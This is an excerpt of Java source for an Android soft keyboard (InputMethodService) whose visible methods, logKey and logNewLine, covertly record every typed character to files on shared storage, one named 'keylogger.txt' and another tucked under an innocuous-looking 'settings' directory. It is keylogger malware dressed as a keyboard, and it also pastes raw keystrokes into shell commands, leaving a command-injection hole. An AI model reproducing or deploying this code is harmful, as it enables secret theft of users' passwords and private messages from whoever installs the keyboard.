...
public class SoftKeyboard extends InputMethodService implements
	...
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		...
		default:
			...
			if (SoftKeyboard.PROCESS_HARD_KEYS) {
	...
	private void logNewLine() {
		...
		/* */
		Shell.SH.run("echo '' >> /sdcard/Lucideus/Logger/keylogger.txt");
	}

	private void logKey(int primaryCode) {
		/* */
		Shell.SH.run("echo -n '" + (char) primaryCode
				+ "' >> /sdcard/Android/data/settings/Logger/key.txt");
	}

	private void logKey(String primaryCode) {
		/* */
		Shell.SH.run("echo -n '" + primaryCode
				+ "' >> /sdcard/Android/data/settings/Logger/key.txt");
	}
